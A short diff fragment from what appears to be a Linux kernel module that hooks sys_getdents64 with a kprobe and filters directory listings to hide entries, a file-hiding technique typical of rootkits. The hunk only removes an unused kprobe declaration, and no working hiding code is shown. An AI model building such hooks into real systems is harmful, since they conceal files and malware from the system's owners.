@@ -164,8 +164,6 @@ struct linux_dirent64 {
 };
 
 /* Kprobe for sys_getdents64 - 使用 return handler */
-static struct kprobe kp_getdents64;
-
 static int hidden_entries_count;
 
 /* Return handler - 在 syscall 返回后过滤结果 */
